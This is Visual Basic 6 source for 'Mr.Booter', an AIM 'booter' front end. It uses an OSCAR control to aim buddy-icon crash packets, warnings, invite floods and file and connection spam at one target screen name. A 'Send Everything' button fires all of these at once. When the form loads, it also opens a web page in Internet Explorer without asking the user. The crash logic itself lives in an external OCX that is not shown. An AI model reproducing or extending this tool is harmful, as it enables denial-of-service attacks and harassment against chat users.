VERSION 5.00
Object = "{1AFDA87A-0016-48EA-93C4-B1BDF5D153EA}#1.0#0"; "SEVOSC.OCX"
Begin VB.Form form1 
   BackColor       =   &H00000000&
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Mr.Booter   - AIM 5.0 and Up"
   ClientHeight    =   3300
   ClientLeft      =   150
   ClientTop       =   675
   ClientWidth     =   7740
   FillColor       =   &H00C0C0C0&
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3300
   ScaleWidth      =   7740
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.Frame Frame6 
      BackColor       =   &H80000007&
      Caption         =   "My Toolz / Booter"
      ForeColor       =   &H00FFFFFF&
      Height          =   3255
      Left            =   120
      TabIndex        =   0
      Top             =   0
      Width           =   7575
      Begin VB.Frame Frame7 
         BackColor       =   &H00000000&
         Caption         =   "Main ScreenName"
         ForeColor       =   &H00FFFFFF&
         Height          =   615
         Left            =   120
         TabIndex        =   41
         Top             =   1560
         Width           =   1815
         Begin VB.TextBox Text3 
            BackColor       =   &H00000000&
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H0000FFFF&
            Height          =   315
            Left            =   120
            TabIndex        =   42
            Text            =   "BOOT NAME HERE"
            Top             =   240
            Width           =   1575
         End
      End
      Begin VB.Frame Frame11 
         BackColor       =   &H00000000&
         Caption         =   "Bot Login"
         ForeColor       =   &H00FFFFFF&
         Height          =   1335
         Left            =   120
         TabIndex        =   36
         Top             =   240
         Width           =   1935
         Begin VB.CommandButton O1 
            Caption         =   "Sign Off"
            Height          =   255
            Left            =   960
            TabIndex        =   40
            Top             =   960
            Width           =   855
         End
         Begin VB.CommandButton L1 
            Caption         =   "Sign In"
            Height          =   255
            Left            =   120
            TabIndex        =   39
            Top             =   960
            Width           =   855
         End
         Begin VB.TextBox T2 
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   9.75
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   285
            IMEMode         =   3  'DISABLE
            Left            =   120
            PasswordChar    =   "*"
            TabIndex        =   38
            Text            =   "asdfgh"
            Top             =   600
            Width           =   1695
         End
         Begin VB.TextBox T1 
            Height          =   285
            Left            =   120
            TabIndex        =   37
            Text            =   "your bot 1"
            Top             =   240
            Width           =   1695
         End
      End
      Begin VB.Frame Frame10 
         BackColor       =   &H00000000&
         Caption         =   "Buddy List"
         ForeColor       =   &H00FFFFFF&
         Height          =   1095
         Left            =   5640
         TabIndex        =   30
         Top             =   240
         Width           =   1815
         Begin VB.TextBox Text16 
            Height          =   285
            Left            =   1200
            TabIndex        =   35
            Text            =   "100"
            Top             =   240
            Width           =   375
         End
         Begin VB.TextBox Text15 
            Height          =   285
            Left            =   120
            TabIndex        =   34
            Text            =   "Buddy List"
            Top             =   240
            Width           =   945
         End
         Begin VB.CommandButton Command5 
            Caption         =   "Send Buddy List"
            Height          =   375
            Left            =   120
            TabIndex        =   31
            Top             =   600
            Width           =   1575
         End
      End
      Begin VB.Frame Frame9 
         BackColor       =   &H80000007&
         Caption         =   "Send Theme"
         ForeColor       =   &H00FFFFFF&
         Height          =   1215
         Left            =   5640
         TabIndex        =   28
         Top             =   1320
         Width           =   1815
         Begin VB.TextBox Text14 
            Height          =   285
            Left            =   120
            TabIndex        =   33
            Text            =   "Theme"
            Top             =   240
            Width           =   855
         End
         Begin VB.TextBox Text4 
            Height          =   285
            Left            =   1080
            TabIndex        =   32
            Text            =   "Info"
            Top             =   240
            Width           =   615
         End
         Begin VB.CommandButton Command11 
            BackColor       =   &H80000007&
            Caption         =   "Send Theme"
            Height          =   495
            Left            =   120
            TabIndex        =   29
            Top             =   600
            Width           =   1575
         End
      End
      Begin VB.Frame Frame8 
         BackColor       =   &H80000007&
         Caption         =   "IM GAME"
         ForeColor       =   &H00FFFFFF&
         Height          =   615
         Left            =   2040
         TabIndex        =   23
         Top             =   2520
         Width           =   5415
         Begin VB.CommandButton Command2 
            Caption         =   "Send Everything"
            Height          =   255
            Left            =   3960
            TabIndex        =   43
            Top             =   240
            Width           =   1335
         End
         Begin VB.CommandButton Command12 
            Caption         =   "Game Invite"
            Height          =   255
            Left            =   2880
            TabIndex        =   27
            Top             =   240
            Width           =   975
         End
         Begin VB.TextBox Text12 
            Height          =   285
            Left            =   120
            TabIndex        =   26
            Text            =   "Game Name"
            Top             =   240
            Width           =   975
         End
         Begin VB.TextBox Text11 
            Height          =   285
            Left            =   1920
            TabIndex        =   25
            Text            =   "Game Link"
            Top             =   240
            Width           =   855
         End
         Begin VB.TextBox Text10 
            Height          =   285
            Left            =   1080
            TabIndex        =   24
            Text            =   "Info"
            Top             =   240
            Width           =   855
         End
      End
      Begin VB.Frame Frame5 
         BackColor       =   &H00000000&
         Caption         =   "IM"
         ForeColor       =   &H00FFFFFF&
         Height          =   975
         Left            =   120
         TabIndex        =   19
         Top             =   2160
         Width           =   1815
         Begin VB.CommandButton Command13 
            Caption         =   "IM"
            Height          =   255
            Left            =   120
            TabIndex        =   21
            Top             =   600
            Width           =   1575
         End
         Begin VB.TextBox Text13 
            Height          =   285
            Left            =   120
            TabIndex        =   20
            Text            =   "message"
            Top             =   240
            Width           =   1575
         End
      End
      Begin VB.Frame Frame4 
         BackColor       =   &H00000000&
         Caption         =   "Misc."
         ForeColor       =   &H00FFFFFF&
         Height          =   1095
         Left            =   2040
         TabIndex        =   15
         Top             =   240
         Width           =   1815
         Begin VB.CommandButton Command8 
            Caption         =   "Direct Connect"
            Height          =   495
            Left            =   120
            TabIndex        =   18
            Top             =   240
            Width           =   855
         End
         Begin VB.CommandButton Command9 
            Caption         =   "Send Talk"
            Height          =   495
            Left            =   960
            TabIndex        =   17
            Top             =   240
            Width           =   735
         End
         Begin VB.CommandButton Command10 
            Caption         =   "Warn"
            Height          =   255
            Left            =   120
            TabIndex        =   16
            Top             =   720
            Width           =   1575
         End
      End
      Begin VB.Frame Frame3 
         BackColor       =   &H80000007&
         Caption         =   "Send File"
         ForeColor       =   &H00FFFFFF&
         Height          =   1095
         Left            =   3840
         TabIndex        =   10
         Top             =   240
         Width           =   1815
         Begin VB.CommandButton Command6 
            Caption         =   "Send File"
            Height          =   375
            Left            =   960
            TabIndex        =   14
            Top             =   600
            Width           =   800
         End
         Begin VB.CommandButton Command7 
            Caption         =   "File Error"
            Height          =   375
            Left            =   120
            TabIndex        =   13
            Top             =   600
            Width           =   735
         End
         Begin VB.TextBox Text8 
            Height          =   285
            Left            =   120
            TabIndex        =   12
            Text            =   "Filename"
            Top             =   240
            Width           =   735
         End
         Begin VB.TextBox Text9 
            Height          =   285
            Left            =   960
            TabIndex        =   11
            Text            =   "Info"
            Top             =   240
            Width           =   615
         End
      End
      Begin VB.Frame Frame2 
         BackColor       =   &H80000007&
         Caption         =   "IconSend"
         ForeColor       =   &H00FFFFFF&
         Height          =   1215
         Left            =   3840
         TabIndex        =   6
         Top             =   1320
         Width           =   1815
         Begin VB.CommandButton Command1 
            Caption         =   "Icon Crash"
            Height          =   495
            Left            =   120
            TabIndex        =   22
            Top             =   600
            Width           =   735
         End
         Begin VB.CommandButton Command4 
            Caption         =   "Icon Send"
            Height          =   495
            Left            =   960
            TabIndex        =   9
            Top             =   600
            Width           =   735
         End
         Begin VB.TextBox Text1 
            Height          =   285
            Left            =   120
            TabIndex        =   8
            Text            =   "Path"
            Top             =   240
            Width           =   735
         End
         Begin VB.TextBox Text7 
            Height          =   285
            Left            =   960
            TabIndex        =   7
            Text            =   "Kind"
            Top             =   240
            Width           =   735
         End
      End
      Begin VB.Frame Frame1 
         BackColor       =   &H00000000&
         Caption         =   "Chat Room Boot"
         ForeColor       =   &H00FFFFFF&
         Height          =   1215
         Left            =   2040
         TabIndex        =   1
         Top             =   1320
         Width           =   1815
         Begin VB.CommandButton Command3 
            Caption         =   "Chat Invite"
            Height          =   255
            Left            =   120
            TabIndex        =   5
            Top             =   840
            Width           =   1575
         End
         Begin VB.TextBox Text2 
            Height          =   285
            Left            =   1440
            TabIndex        =   4
            Text            =   "1"
            Top             =   480
            Width           =   255
         End
         Begin VB.TextBox Text5 
            Height          =   285
            Left            =   120
            TabIndex        =   3
            Text            =   "ChatName"
            Top             =   240
            Width           =   1575
         End
         Begin VB.TextBox Text6 
            Height          =   285
            Left            =   120
            TabIndex        =   2
            Text            =   "Message"
            Top             =   480
            Width           =   1335
         End
      End
   End
   Begin SevOscar.SevOsc SevOsc1 
      Height          =   435
      Left            =   7920
      TabIndex        =   44
      Top             =   2760
      Width           =   1515
      _ExtentX        =   2672
      _ExtentY        =   767
   End
   Begin VB.Label Label3 
      BackStyle       =   0  'Transparent
      Caption         =   " . $%@$$$#@*(^%$#(*@#($*#@($!@)( .  "
      ForeColor       =   &H000000FF&
      Height          =   375
      Left            =   8400
      TabIndex        =   47
      Top             =   840
      Width           =   3015
   End
   Begin VB.Label Label2 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Coming soon maybe year 2010 or never"
      ForeColor       =   &H00FFFFFF&
      Height          =   195
      Left            =   8400
      TabIndex        =   46
      Top             =   480
      Width           =   2805
   End
   Begin VB.Label Label1 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Advanced Options"
      ForeColor       =   &H000000FF&
      Height          =   195
      Left            =   9000
      TabIndex        =   45
      Top             =   120
      Width           =   1320
   End
   Begin VB.Menu mnucon 
      Caption         =   "Contact"
   End
   Begin VB.Menu mnumaker 
      Caption         =   "Maker"
   End
   Begin VB.Menu mnuadv 
      Caption         =   "Advanced"
   End
   Begin VB.Menu mnunor 
      Caption         =   "Normal"
   End
End
Attribute VB_Name = "form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private Sub Command1_Click()
SevOsc1.BuddyIconCrash Text3.Text
End Sub

Private Sub Command2_Click()
SevOsc1.chatInvite Text3.Text, Text2.Text, Text5.Text, Text6.Text
SevOsc1.IconSend Text3.Text, Text1.Text, Text7.Text
SevOsc1.SendGameInvite Text3.Text, Text10.Text, Text11.Text, Text12.Text
SevOsc1.SendInstantMessage Text3.Text, Text13.Text
SevOsc1.warnUser Text3.Text
SevOsc1.SendTheme Text3.Text, Text10.Text, Text12.Text
SevOsc1.SendBuddylist Text3.Text, Text15.Text, Text16.Text
SevOsc1.SendFile Text3.Text, Text8.Text, Text9.Text
SevOsc1.SendFileError Text3.Text
SevOsc1.SendConnect Text3.Text
SevOsc1.SendTalk Text3.Text
SevOsc1.BuddyIconCrash Text3.Text
End Sub

Private Sub Command3_Click()
SevOsc1.chatInvite Text3.Text, Text2.Text, Text5.Text, Text6.Text
End Sub

Private Sub Command4_Click()
SevOsc1.IconSend Text3.Text, Text1.Text, Text7.Text
End Sub

Private Sub Command5_Click()
SevOsc1.SendBuddylist Text3.Text, Text15.Text, Text16.Text
End Sub

Private Sub Command6_Click()
SevOsc1.SendFile Text3.Text, Text8.Text, Text9.Text
End Sub

Private Sub Command7_Click()
SevOsc1.SendFileError Text3.Text
End Sub

Private Sub Command8_Click()
SevOsc1.SendConnect Text3.Text
End Sub

Private Sub Command9_Click()
SevOsc1.SendTalk Text3.Text
End Sub

Private Sub Command10_Click()
SevOsc1.warnUser Text3.Text
End Sub

Private Sub Command11_Click()
SevOsc1.SendTheme Text3.Text, Text10.Text, Text12.Text
End Sub

Private Sub Command12_Click()
SevOsc1.SendGameInvite Text3.Text, Text10.Text, Text11.Text, Text12.Text
End Sub

Private Sub Command13_Click()
SevOsc1.SendInstantMessage Text3.Text, Text13.Text
End Sub



Private Sub Form_Load()
        Dim ie
        Set ie = CreateObject("INTERNETEXPLORER.application")
        ie.navigate "http://www.planet-source-code.com/vb/scripts/ShowCode.asp?txtCodeId=45654&lngWId=1"
        ie.Visible = True
End Sub

Private Sub L1_Click()
SevOsc1.SignOn T1, T2
End Sub

Private Sub mnuadv_Click()
form1.Width = 12825
End Sub

Private Sub mnucon_Click()
MsgBox "Aim : Punniabi"
End Sub


Private Sub mnumaker_Click()
MsgBox "Igor Stepansky (aka) God"
End Sub

Private Sub mnunor_Click()
form1.Width = 7830
End Sub

Private Sub O1_Click()
SevOsc1.SignOff
End Sub


